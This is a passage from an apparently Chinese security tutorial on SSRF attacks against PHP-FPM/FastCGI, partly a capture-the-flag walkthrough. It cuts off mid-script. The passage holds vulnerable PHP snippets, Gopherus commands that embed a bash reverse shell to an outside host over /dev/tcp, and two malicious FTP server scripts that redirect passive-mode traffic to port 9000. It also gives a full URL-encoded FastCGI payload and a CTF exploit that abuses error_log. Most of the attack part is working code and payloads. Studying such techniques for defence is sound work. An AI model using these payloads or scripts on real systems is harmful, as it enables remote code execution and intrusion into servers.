<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">python gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/html/index.php                 #已知php文件，默认为index.php</span><br><span class="line">ls                                      #要执行的命令</span><br></pre></td></tr></table></figure>

<p>二次编码后即可直接拼接链接使用，get请求一般会解码一次，curl又会解码一次，需不需要二次编码取决于是不是curl函数。</p>
<h1 id="SSRF中的攻击点"><a href="#SSRF中的攻击点" class="headerlink" title="SSRF中的攻击点"></a>SSRF中的攻击点</h1><h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><p>curl这是一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$link = $_POST[&#x27;url&#x27;];</span><br><span class="line">$curlobj = curl_init();</span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($curlobj);</span><br><span class="line">curl_close($curlobj);</span><br><span class="line"> </span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span><br><span class="line">file_put_contents($filename, $result); </span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><strong>file_get_contents()</strong></h4><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line">$content = file_get_contents($_POST[&#x27;url&#x27;]); </span><br><span class="line">$filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; </span><br><span class="line">file_put_contents($filename, $content); </span><br><span class="line">echo $_POST[&#x27;url&#x27;]; </span><br><span class="line">$img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">echo $img; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="sockopen"><a href="#sockopen" class="headerlink" title="sockopen()"></a><strong>sockopen()</strong></h4><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) </span><br><span class="line">&#123; </span><br><span class="line">$fp = fsockopen($host, intval($port), $errno, $errstr, 30); </span><br><span class="line">if (!$fp) &#123; </span><br><span class="line">echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">&#125; else &#123; </span><br><span class="line">$out = &quot;GET $link HTTP/1.1\r\n&quot;; </span><br><span class="line">$out .= &quot;Host: $host\r\n&quot;; </span><br><span class="line">$out .= &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">$out .= &quot;\r\n&quot;; </span><br><span class="line">fwrite($fp, $out); </span><br><span class="line">$contents=&#x27;&#x27;; </span><br><span class="line">while (!feof($fp)) &#123; </span><br><span class="line">$contents.= fgets($fp, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose($fp); </span><br><span class="line">return $contents; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>以上我们的攻击都是基于curl_exec()函数所进行的攻击。接下来我们会通过案例的方式讲解file_get_contents()和sockopen()。</p>
<h1 id="FTP攻击FPM-x2F-FastCGI"><a href="#FTP攻击FPM-x2F-FastCGI" class="headerlink" title="FTP攻击FPM&#x2F;FastCGI"></a>FTP攻击FPM&#x2F;FastCGI</h1><p>利用FTP的被动模式，假如我们指定227 Entering Passive Mode <code>(127,0,0,1,0,9000)</code> ，那么便可以将地址和端口指到 127.0.0.1:9000，也就是本地的 9000 端口。同时由于 FTP 的特性，其会把传输的数据原封不动的发给本地的 9000 端口，不会有任何的多余内容。如果我们将传输的数据换为特定的 Payload 数据，那我们便可以攻击内网特定端口上的应用了。在这整个过程中，FTP 只起到了一个重定向 Payload 的内容。</p>
<h4 id="姿势一：写入文件"><a href="#姿势一：写入文件" class="headerlink" title="姿势一：写入文件"></a>姿势一：写入文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&lt;?php</span><br><span class="line">    file_put_contents($_GET[&#x27;file&#x27;], $_GET[&#x27;data&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>file_put_contents () 函数把<strong>一个字符串写入文件中。</strong>与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。</p>
<p><code>file_put_contents</code>函数使用前需要将<code>php.ini</code>的<code>allow_url_fopen</code>设置为ON。</p>
<p>这个点是存在WebShell写入漏洞的，但是在不能写文件的环境下该如何利用呢？那么可以利用SSRF进行攻击。</p>
<p>众所周知，如果我们能向 PHP-FPM 发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与gopher:&#x2F;&#x2F;协议结合使用，curl支持gopher:&#x2F;&#x2F;协议，但file_get_contents却不支持。</p>
<p>那么我们如何才能实现 RCE 呢？可以利用FTP协议的被动模式，即：如果一个客户端试图从FTP服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个有服务端指定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。</p>
<p>假设此时发现内网中存在 PHP-FPM，那我们可以通过 FTP 的被动模式攻击内网的 PHP-FPM。</p>
<p>首先使用 Gopherus 生成 Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">python gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/html/index.php  # 这里输入的是目标主机上一个已知存在的php文件</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.43.247/2333 0&gt;&amp;1&quot;  # 这里输入的是要执行的命令</span><br></pre></td></tr></table></figure>

<p>得到的payload只截取 <code>_</code> 后面的数据部分。</p>
<p>然后再攻击机上执行以下python脚本搭建一个恶意的 ftp 服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># evil_ftp.py</span><br><span class="line">import socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((&#x27;0.0.0.0&#x27;, 23))        # ftp服务绑定23号端口</span><br><span class="line">s.listen(1)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(b&#x27;220 welcome\n&#x27;)</span><br><span class="line">#Service ready for new user.</span><br><span class="line">#Client send anonymous username</span><br><span class="line">#USER anonymous</span><br><span class="line">conn.send(b&#x27;331 Please specify the password.\n&#x27;)</span><br><span class="line">#User name okay, need password.</span><br><span class="line">#Client send anonymous password.</span><br><span class="line">#PASS anonymous</span><br><span class="line">conn.send(b&#x27;230 Login successful.\n&#x27;)</span><br><span class="line">#User logged in, proceed. Logged out if appropriate.</span><br><span class="line">#TYPE I</span><br><span class="line">conn.send(b&#x27;200 Switching to Binary mode.\n&#x27;)</span><br><span class="line">#Size /</span><br><span class="line">conn.send(b&#x27;550 Could not get the file size.\n&#x27;)</span><br><span class="line">#EPSV (1)</span><br><span class="line">conn.send(b&#x27;150 ok\n&#x27;)</span><br><span class="line">#PASV</span><br><span class="line">conn.send(b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;) #STOR / (2) </span><br><span class="line"># &quot;127,0,0,1&quot;PHP-FPM服务为受害者本地，&quot;9000&quot;为为PHP-FPM服务的端口号</span><br><span class="line">conn.send(b&#x27;150 Permission denied.\n&#x27;)</span><br><span class="line">#QUIT</span><br><span class="line">conn.send(b&#x27;221 Goodbye.\n&#x27;)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>

<p>并在 vps 上开启一个 nc 监听，用于接收反弹的shell:</p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220925101742307.png" alt="image-20220925101742307"></p>
<p>最后构造 url 发送 payload 即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">/?file=ftp://192.168.43.247:23/123&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.43.247/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>

<h4 id="姿势二：读取，写回文件"><a href="#姿势二：读取，写回文件" class="headerlink" title="姿势二：读取，写回文件"></a>姿势二：读取，写回文件</h4><p>我们可以了解一下（CVE-2021-3129）这个漏洞。该漏洞的核心就是传入 file_get_contents() 和 file_put_contents() 这两个函数中的内容没有经过过滤，从而可以通过精巧的构造触发 phar 反序列化，达到RCE的效果。</p>
<p>漏洞代码大致可以简化为如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&lt;?php</span><br><span class="line">$contents = file_get_contents($_GET[&#x27;viewFile&#x27;]);</span><br><span class="line">file_put_contents($_GET[&#x27;viewFile&#x27;], $contents);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到这里主要功能点是：读取一个给定的路径 <code>$_GET[&#39;viewFile&#39;]</code>，之后写回文件中 <code>$_GET[&#39;viewFile&#39;]</code>，这相当于什么都没有做！</p>
<p>由于我们可以运行 file_get_contents() 来查找任何东西，因此，可以运用 SSRF 常用的姿势，通过发送HTTP请求来扫描常用端口。假设此时我们发现目标正在监听 9000 端口，则很有可能目标主机上正在运行着 PHP-FPM，我们可以进一步利用该漏洞来攻击 PHP-FPM。</p>
<p>现在，如果我们尝试使用 <code>viewFile=ftp://evil-server/file.txt</code> 来利用这个漏洞，会发生以下情况：</p>
<ul>
<li>首先通过 file_get_contents() 函数连接到我们的FTP服务器，并下载file.txt。</li>
<li>然后再通过 file_put_contents() 函数连接到我们的FTP服务器，并将其上传回file.txt。</li>
</ul>
<p>现在，你可能已经知道这是怎么回事：我们将使用 FTP 协议的被动模式让 file_get_contents() 在我们的服务器上下载一个文件，当它试图使用 file_put_contents() 把它上传回去时，我们将告诉它把文件发送到 127.0.0.1:9000。这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF了。</p>
<p>下面我们来演示一下攻击过程。</p>
<p>首先，我们使用gopherus生成攻击fastcgi的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">python gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/html/index.php  # 这里输入的是目标主机上一个已知存在的php文件</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.43.247/2333 0&gt;&amp;1&quot;  # 这里输入的是要执行的命令</span><br></pre></td></tr></table></figure>

<p>老规矩，我们只取__后面的数据。然后在攻击机上开启监听。</p>
<p>我们利用别人的脚本搭建一个恶意的ftp服务，并将上面的payload中的数据替换掉下面ftp脚本中的payload的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2021/1/13 6:56 下午</span><br><span class="line"># @Author  : tntaxin</span><br><span class="line"># @File    : ftp_redirect.py</span><br><span class="line"># @Software:</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">from urllib.parse import unquote</span><br><span class="line"></span><br><span class="line"># 对gopherus生成的payload进行一次urldecode</span><br><span class="line">payload = unquote(&quot;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.43.247/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&quot;)</span><br><span class="line">payload = payload.encode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">host = &#x27;0.0.0.0&#x27;</span><br><span class="line">port = 23</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((host, port))</span><br><span class="line">sk.listen(5)</span><br><span class="line"></span><br><span class="line"># ftp被动模式的passvie port,监听到1234</span><br><span class="line">sk2 = socket.socket()</span><br><span class="line">sk2.bind((host, 1234))</span><br><span class="line">sk2.listen()</span><br><span class="line"></span><br><span class="line"># 计数器，用于区分是第几次ftp连接</span><br><span class="line">count = 1</span><br><span class="line">while 1:</span><br><span class="line">    conn, address = sk.accept()</span><br><span class="line">    conn.send(b&quot;200 \n&quot;)</span><br><span class="line">    print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名</span><br><span class="line">    if count == 1:</span><br><span class="line">        conn.send(b&quot;220 ready\n&quot;)</span><br><span class="line">    else:</span><br><span class="line">        conn.send(b&quot;200 ready\n&quot;)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span><br><span class="line">    if count == 1:</span><br><span class="line">        conn.send(b&quot;215 \n&quot;)</span><br><span class="line">    else:</span><br><span class="line">        conn.send(b&quot;200 \n&quot;)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小</span><br><span class="line">    if count == 1:</span><br><span class="line">        conn.send(b&quot;213 3 \n&quot;)  </span><br><span class="line">    else:</span><br><span class="line">        conn.send(b&quot;300 \n&quot;)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(20))  # EPSV\r\n&#x27;</span><br><span class="line">    conn.send(b&quot;200 \n&quot;)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式</span><br><span class="line">    if count == 1:</span><br><span class="line">        conn.send(b&quot;227 127,0,0,1,4,210\n&quot;)  # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span><br><span class="line">    else:</span><br><span class="line">        conn.send(b&quot;227 127,0,0,1,35,40\n&quot;)  # 端口计算规则：35*256+40=9000</span><br><span class="line"></span><br><span class="line">    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span><br><span class="line">    if count == 1:</span><br><span class="line">        conn.send(b&quot;125 \n&quot;) # 告诉客户端可以开始数据连接了</span><br><span class="line">        # 新建一个socket给服务端返回我们的payload</span><br><span class="line">        print(&quot;建立连接!&quot;)</span><br><span class="line">        conn2, address2 = sk2.accept()</span><br><span class="line">        conn2.send(payload)</span><br><span class="line">        conn2.close()</span><br><span class="line">        print(&quot;断开连接!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        conn.send(b&quot;150 \n&quot;)</span><br><span class="line">        print(conn.recv(20))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    # 第一次连接是下载文件，需要告诉客户端下载已经结束</span><br><span class="line">    if count == 1:</span><br><span class="line">        conn.send(b&quot;226 \n&quot;)</span><br><span class="line">    conn.close()</span><br><span class="line">    count += 1</span><br></pre></td></tr></table></figure>

<p>这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的 payload；当客户端第二次连接的时候将客户端的连接重定向到 127.0.0.1:9000，也就是目标主机上 php-fpm 服务的端口，从而造成 SSRF，攻击其 php-fpm。</p>
<p>最后我们直接发起请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">/ssrf.php?viewFile=ftp://192.168.43.247:23/123</span><br></pre></td></tr></table></figure>

<p>当然，FTP协议不仅能攻击FPM，还能攻击Redis和Mysql。</p>
<p>可以参考文章:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/aYrolbts1KiZb3oWPEaBcQ">https://mp.weixin.qq.com/s/aYrolbts1KiZb3oWPEaBcQ</a></p>
<h1 id="基于fsockopen-的骚姿势"><a href="#基于fsockopen-的骚姿势" class="headerlink" title="基于fsockopen()的骚姿势"></a>基于fsockopen()的骚姿势</h1><p>常规的脚本打fastcgi模式都是基于<code>auto_prepend_file </code>,<code>extension</code>等，而下面的例题用error_log这个配置进行攻击。（浙江省信息安全竞赛初赛baby_ssssrf）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&lt;?php highlight_file(__FILE__); if(isset($_GET[&#x27;data&#x27;])&amp;&amp;isset($_GET[&#x27;host&#x27;])&amp;&amp;isset($_GET[&#x27;port&#x27;]))&#123; </span><br><span class="line">$data = base64_decode($_GET[&#x27;data&#x27;]); </span><br><span class="line">$host = $_GET[&#x27;host&#x27;]; </span><br><span class="line">$port = $_GET[&#x27;port&#x27;]; </span><br><span class="line">if(preg_match(&#x27;/usr|auto|extension|dir/i&#x27;, $data))&#123; </span><br><span class="line">	die(&#x27;error&#x27;); </span><br><span class="line">&#125; </span><br><span class="line">$fp = fsockopen($host,intval($port),$errno, $errstr, 30); </span><br><span class="line">if (!$fp) &#123; </span><br><span class="line">	die(); </span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">	fwrite($fp, $data); </span><br><span class="line">	while (!feof($fp)) &#123; </span><br><span class="line">		echo fgets($fp, 128); </span><br><span class="line">	&#125; </span><br><span class="line">	fclose($fp); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br><span class="line">&lt;!-- flag.php --&gt;</span><br></pre></td></tr></table></figure>

<p>我们取访问flag.php的时候要求本地访问，这里可以用<code>fsockopen</code>函数打开一个网络连接或者一个Unix套接字连接，这里直接连本地80端口。</p>
<p>详解PHP fsockopen的使用方法:详解PHP fsockopen的使用方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">GET /flag.php HTTP/1.1 </span><br><span class="line">Host: 127.0.0.1 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 </span><br><span class="line">Accept-Encoding: deflate </span><br><span class="line">Connection: close Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>发送数据包过去即可拿到flag.php源码.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&lt;?php </span><br><span class="line">$allow = array(&#x27;127.0.0.1&#x27;,&#x27;localhost&#x27;); if(in_array($_SERVER[&#x27;HTTP_HOST&#x27;],$allow))&#123; </span><br><span class="line">	highlight_file(__FILE__); </span><br><span class="line">	$contents = isset($_POST[&#x27;data&#x27;])?$_POST[&#x27;data&#x27;]:&#x27;&#x27;; 	</span><br><span class="line">	if(!preg_match(&#x27;/lastsward/i&#x27;, $contents))&#123; 	</span><br><span class="line">		file_put_contents(&#x27;hint.txt&#x27;, $contents); </span><br><span class="line">	&#125; </span><br><span class="line">	if(file_get_contents(&#x27;hint.txt&#x27;)===&#x27;lastsward&#x27;)&#123;</span><br><span class="line">    	phpinfo(); </span><br><span class="line">    &#125;</span><br><span class="line">    die();   </span><br><span class="line">&#125; </span><br><span class="line">die(&#x27;请从本地访问&#x27;)</span><br></pre></td></tr></table></figure>

<p>利用数组data[]&#x3D;lastward绕过，发包拿到phpinfo。</p>
<p>我们可以看到Server API：Fpm&#x2F;FastCGI 这个配置。</p>
<p>但是index.php对数据包的数据有过滤，我们常见的攻击模式都是基于auto_prepend_file，extension等，不能常规打点。所以需要在php Runtime Configuration中找到一个要么可以执行代码，或者包含文件，或者写文件的配置。经过筛选，我看到了<code>error_log</code>这个配置触发报错并且把报错信息写入某一个文件，fsockopen&#96;函数报错会显示错误的host和port。但是报错信息可能会被实体编码，需要使：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">$php_value = &quot;html_errors = Off\nerror_log = /var/www/html/3333.php&quot;;</span><br></pre></td></tr></table></figure>

<p>将html_errors关闭，将其目录文件改为一个我们方便访问的。</p>
<p>修改别人Exp：<a target="_blank" rel="noopener" href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php">https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 